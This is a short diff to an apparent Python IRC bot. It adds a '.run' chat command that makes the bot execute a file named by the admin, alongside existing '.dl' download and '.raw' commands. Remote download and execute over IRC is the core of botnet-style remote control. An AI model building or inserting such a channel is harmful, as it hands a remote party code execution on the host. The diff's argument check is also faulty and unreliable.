@@ -369,6 +369,16 @@ def main():
                         message = "Could not parse. The message should be in the format of '.dl [url] [file]' to work properly."
                     sendntc(message, adminname)
                                
+                # Respond to the '.run [executable file]' command from admin.
+                if name.lower() == adminname.lower() and message[:5].find('.run') != -1:
+                    if message.split(' ', 1)[1] != -1:
+                        exec_file = message.split(' ', 1)[1]
+                        message = "Running the executable file: " + exec_file
+                        execute(exec_file)
+                    else:
+                        message = "Could not parse. The message should be in the format of '.run [executable file]' to work properly."
+                    sendntc(message, adminname)
+                
                 # Respond to the '.raw [command]' command from admin.
                 if name.lower() == adminname.lower() and message[:5].find('.raw') != -1:
                     if message.split(' ', 1)[1] != -1:
